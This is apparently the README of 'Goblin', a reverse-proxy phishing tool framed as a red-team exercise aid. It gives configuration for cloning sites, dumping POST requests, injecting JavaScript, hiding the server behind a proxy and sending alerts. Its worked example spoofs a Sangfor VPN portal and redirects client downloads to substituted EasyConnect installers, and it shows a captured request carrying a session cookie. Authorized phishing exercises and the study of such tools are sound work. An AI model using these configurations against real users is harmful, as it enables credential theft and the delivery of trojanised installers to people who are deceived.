# Goblin for Phishing Exercise Tools

![GitHub branch checks state](https://img.shields.io/github/checks-status/xiecat/goblin/master) [![Latest release](https://img.shields.io/github/v/release/xiecat/goblin)](https://github.com/becivells/iconhash/releases/latest) ![GitHub Release Date](https://img.shields.io/github/release-date/xiecat/goblin) ![GitHub All Releases](https://img.shields.io/github/downloads/xiecat/goblin/total) [![GitHub issues](https://img.shields.io/github/issues/xiecat/goblin)](https://github.com/xiecat/goblin/issues) [![Docker Pulls](https://img.shields.io/docker/pulls/becivells/goblin)](https://hub.docker.com/r/becivells/goblin) ![Docker Image Size (latest by date)](https://img.shields.io/docker/image-size/becivells/goblin)      
[[中文readme点我]](https://github.com/zhzyker/dismap/blob/main/readme.md)  
Goblin is a phishing rehearsal tool for red-blue confrontation. By using a reverse proxy, it is possible to obtain information about a user without affecting the user's operation perceptibly, or to induce the user's operation. The purpose of hiding the server side can also be achieved by using a proxy. Built-in plug-in, through a simple configuration, quickly adjust the content of the web page to achieve a better exercise effect.

## Features

* Support for caching static files to speed up access.
* Supports dumping all requests, dumping requests that match the rules.
* Support quick configuration through plug-ins to adjust inappropriate jumps or content.
* Support for implanting specific javacript code.
* Support for modifying the content of responses or goblin requests.
* Support hiding real IP by proxy.

Quick Start

```bash
docker run -it -v $(pwd):/goblin/ -p 8084:8084 becivells/goblin
```

Access to <http://127.0.0.1:8084>

If the server-side deployment requires changing the ip address.

```yaml
  Site:
    server_ip:8084:  ## Change to domain name or server IP
      Listen: 0.0.0.0
      StaticPrefix: x9ut17jbqa
      SSL: false
      CAKey: ""
      CACert: ""
      ProxyPass: https://www.google.com
      Plugin: demo
```

## Command-line arguments

```bash
Usage of goblin:
  -config string
        Webserver port (default "goblin.yaml")
  -gen-plugin string
        Generate rule file
  -log string
        Webserver log file (default "goblin.log")
  -log-level int
        Log mode [1-5] 1.dump All logs include GET log and POST log, 2. Record POST log, 3. Record dump log in rules, 4. Record error log, and 5. Record exception exit log (default 2)
  -print-config
        print config file
  -test-notice
        Test message alarm
  -v    Show version of goblin
  -w    Write config to config file
```

## Configuration file explanation

```yaml
Server: # Some timeouts on the server, just set the default value.
  IdleTimeout: 3m0s
  ReadTimeout: 5m0s
  WriteTimeout: 5m0s
  ReadHeaderTimeout: 30s
  ProxyHeader: RemoteAddr  # Get the real IP, the default is the accessed IP
  StaticDir: static # For ease of use, some tools can be placed in the local static file directory
  StaticURI: /cgmeuovumtpp/ # Static file server access directory
Proxy:
  MaxIdleConns: 512 # Some proxy configuration, just set the default value
  IdleConnTimeout: 2m0s
  TLSHandshakeTimeout: 1m0s
  ExpectContinueTimeout: 1s
  maxcontentlength: 20971520 # Handling response data, the maximum value defaults to 20M, beyond this value, operations in the plugin that require reading the body will be cancelled.
  ProxyServerAddr: ""   # Set the proxy and make web requests through the proxy after setting.
  ProxyCheckURL: https://myip.ipip.net/ # Check if the proxy settings are correct.
  PluginDir: plugins
  Site:
    127.0.0.1:8083: # The host in the request header, similar to nginx server_name. If it does not match, access will not be possible.
      Listen: 0.0.0.0  # Listening address.
      StaticPrefix: 8jaojfbykixr # This is using the InjectJs module. It is used to access the injected JS.
      SSL: false  # https.
      CAKey: ""
      CACert: ""
      ProxyPass: https://www.github.com/  # Site that need to be proxied.
      Plugin: "" # Required plug-ins, currently only one plugin can be used.
    127.0.0.1:8084:
      Listen: 0.0.0.0
      StaticPrefix: daulbsly9ysk
      SSL: false
      CAKey: ""
      CACert: ""
      ProxyPass: https://www.google.com
      Plugin: ""  # Required plug-ins, currently only one plugin can be used.
Notice:
  dingtalk:
    DingTalk: # Reminder address for DingTalk.
iplocation:
  type: qqwry   # Geographical location search database.
  geo_license_key: ""
log_file: goblin.log
cache:
  type: self  # The available cache types are [redis,none,self]. self: cache to local, redis: cache to redis, none: no cache.
  expire_time: 10m0s # Cache expiration time.
  redis:
    host: 127.0.0.1
    port: 6379
    password: hq7TKpR6B11w8
    db: 0
CacheType: # Cacheable path suffixes, currently static files with parameters are not cached.
- png
- jpg
- js
- jpeg
- css
- otf
- ttf
CacheSize: 12582912 # Maximum cache size.
```

## Plugin System

Use `-gen-plugin plugin name(vpn)` to generate the plugin(vpn.yaml), write it and put it in the `plugins` directory.

Specify the rule name in `goblin.yaml`.

```yaml
  Site:
    127.0.0.1:8083: # The host in the request header, similar to nginx server_name. If it does not match, access will not be possible.
      Listen: 0.0.0.0  # Listening address.
      StaticPrefix: 8jaojfbykixr # This is using the InjectJs module. It is used to access the injected JS.
      SSL: false  # SSL is temporarily unavailable.
      CAKey: ""
      CACert: ""
      ProxyPass: https://www.douban.com/  # Site that need to be proxied.
      Plugin: "vpn" # Required plug-ins, currently only one plugin can be used.
```

### Plugin file explanation

```yaml
Name: sanforvpn_1.0 # Cannot be empty.
Version: 1.0.0 # Cannot be empty.
Description: this is a description # Cannot be empty.
WriteDate: "2021-02-11" # Cannot be empty.
Author: goblin # Cannot be empty.
Rule:
- url: /tttttttt # Matching path.
  Match: word # Three types of matches: [word,prefix,Suffix]. word is a full match, prefix is a prefix, suffix is a suffix. No Regular expressions is used here.
  Replace: # Replacement Module.
  - Request:
      Method: # Match to GET or POST to perform replacement.
      - GET
      - POST
      Header:
        goblin: 1.0.1  # Replace the header content. If empty, it is deleted.
    Response: # Replacement response content.
      Status: 200 
      Header: # Replace the header content. If empty, it is deleted.
        goblinServer: 0.0.1
      Body:
        File: "" # Using file replacement, the ReplaceStr setting is invalid after having the value here.
        ReplaceStr: # Replace string.
        - Old: Hello World
          New: Hello Word122
          Count: -1
        Append: "" # Append string.
- url: /dump
  Match: word
  Dump:  # Data to be dumped.
  - Request:
      Method: # Match to the following request method before you can operate.
      - POST
    Response:
      Status: 200
      Header: {} 
      Body: "" # 
    notice: false # To use DingTalk reminder or not
- url: /test.js ## JS to be replaced, with preference for global JS.
  Match: word ## Matching method.
  InjectJs:
    File: aaa.js ## The JS to be replaced, it can be a file or a url.
```

Variable

`{{ .Static }}` corresponds to the static server directory.

`Replace.Response.Header.Location`， `InjectJs`，`Replace.Response.Body.Append`,`rp.Response.Body.ReplaceStr.New` are the only ones currently available for Replace.

## Proxy Settings

goblin uses a reverse proxy. The frontend uses a proxy such as cloudflare goblin, that can hide the goblin host.

## JS Injection

There are two ways to inject javascript: one is to follow the page (Replace requires you to append `\<script\>` tags), and the other is to follow the global js file, each approach has its own benefits.

Both of these actually use the Replace function.

### Injecting with InjectJs

```yaml
- url: /base.js # JS to be replaced, with preference for global JS.
  Match: word   # Matching method.
  InjectJs:
    File: aaa.js # The JS to be replaced, it can be a file or a url.
```

### Use replace to inject

```yaml
- url: /art_103.html # Pages to be replaced.
  Match: Word
  Replace: # Replacement Module.
    - Request:
        Method: # Match to the following request method before replacement.
          - GET
          - POST
        Header:
          goblin: 1.0.1  # Replace the header content. If empty, it is deleted.
      Response: # Replacement response content.
        Body:
          Append: "<script type='text/javascript' src='{{ .Static }}a.js'></script>" # Append string.
```

## Some cases

### Sangfor vpn client replacement

Write a plugin with Sangfor download files as an example.

Visit to learn that the Windows client of Sangfor vpn can be downloaded directly, the Mac client needs to be downloaded from the official link.

When you access the home page, you will be redirected to the correct URL login portal(`/portal/#!/login`), make the following changes directly.

```yaml
Rule:
- url: /  ## Access
  Match: word # Be sure to use full match.
  Replace:
  - Request:
      Method:
      - GET
    Response:
      Status: 302
      Header:
        Location: /portal/#!/login
```

### exe program replacement

```yaml
- url: /com/EasyConnectInstaller.exe
  Match: word
  Replace:
    - Request:
        Method:
          - GET
      Response:
        Status: 302
        Header:
          Location: "{{ .Static }}/EasyConnectInstaller.exe" # cgmeuovumtpp is a static file directory.
```

### Mac Program Replacement

The Mac program download address is in the js where you can replace it directly or by jumping to it.

Modify the path to jump to the goblin address.

```yaml
- url: /portal/jssdk/api/common.js
  Match: prefix # With parameters using prefix matching.
  Replace:
    - Request:
        Method:
          - GET
      Response:
        Body:
          ReplaceStr:
            - Old: http://download.sangfor.com.cn/download/product/sslvpn/pkg/
              New: /download/product/sslvpn/pkg/
              Count: -1
```

Replace the download address with the modified address.

```yaml
- url: /download/product/sslvpn/pkg/
  Match: prefix
  Replace:
    - Request:
        Method:
          - GET
      Response:
        Status: 302
        Header:
          Location: "{{ .Static }}/EasyConnect.dmg"
```

## DingTalk Reminder

Exe

```yaml
  - url: /com/EasyConnectInstaller.exe
    Match: word
    Dump:
      - Request:
          Method:
            - GET
        notice: true
```

Dmg

```yaml
  - url: /portal/jssdk/api/common.js
    Match: prefix
    Replace:
      - Request:
          Method:
            - GET
        Response:
          Body:
            ReplaceStr:
              - Old: http://download.sangfor.com.cn/download/product/sslvpn/pkg/
                New: /download/product/sslvpn/pkg/
                Count: -1
  - url: /download/product/sslvpn/pkg/
    Match: prefix
    Replace:
      - Request:
          Method:
            - GET
        Response:
          Status: 302
          Header:
            Location: "{{ .Static }}/EasyConnect.dmg" //
    Dump:
      - Request:
          Method:
            - GET
        notice: true
```

## The complete plugin is as follows

```yaml
Name: sanfor vpn
Version: 1.0.0
Description: this is a description
WriteDate: "2021-02-11"
Author: goblin
Rule:
  - url: /  ## 访问
    Match: word
    Replace:
      - Request:
          Method:
            - GET
        Response:
          Status: 302
          Header:
            goblinServer: 0.0.1
            Location: /portal/#!/login
  - url: /com/EasyConnectInstaller.exe
    Match: word
    Replace:
      - Request:
          Method:
            - GET
        Response:
          Status: 302
          Header:
            Location: "{{ .Static }}EasyConnectInstaller.exe"
  - url: /portal/jssdk/api/common.js
    Match: prefix
    Replace:
      - Request:
          Method:
            - GET
        Response:
          Body:
            ReplaceStr:
              - Old: http://download.sangfor.com.cn/download/product/sslvpn/pkg/
                New: /download/product/sslvpn/pkg/
                Count: -1
  - url: /download/product/sslvpn/pkg/
    Match: prefix
    Replace:
      - Request:
          Method:
            - GET
        Response:
          Status: 302
          Header:
            Location: "{{ .Static }}EasyConnect.dmg"
    Dump:
      - Request:
          Method:
            - GET
        notice: true

  - url: /com/EasyConnectInstaller.exe
    Match: word
    Dump:
      - Request:
          Method:
            - GET
        notice: true
```

After accessing, you will receive DingTalk alerts and dump the following request content.

```http
GET /download/product/sslvpn/pkg/mac_767/EasyConnect_7_6_7_4.dmg HTTP/1.1
Host: vpn.xxxxx.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: language=zh_CN; TWFID=7c0a08ff5295831d
Referer: http://127.0.0.1:8085/portal/
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0
X-Forwarded-For: 127.0.0.1
```

## FAQ

1. Some websites will directly 302 jump to the normal page after change, no matter how can not cancel. Finally found the solution to add xff xfi header.

```yaml
      - Request:
          Method:
            - GET
          Header:
            x-forwarded-for: 127.0.0.1
            x-real-ip: 127.0.0.1
```

## Todo

- Support websocket.
- Plugin system enhancement (built-in variables), more matching rules.
- Front-end record input box input.

## Acknowledgements

Thanks to Master(小明)'s use, feedback and suggestions, and [\_0xf4n9x\_](https://github.com/FanqXu)'s suggestions. [judas](https://github.com/JonCooperWorks/judas) brought inspiration, and references to other projects, to enable quick implementation.





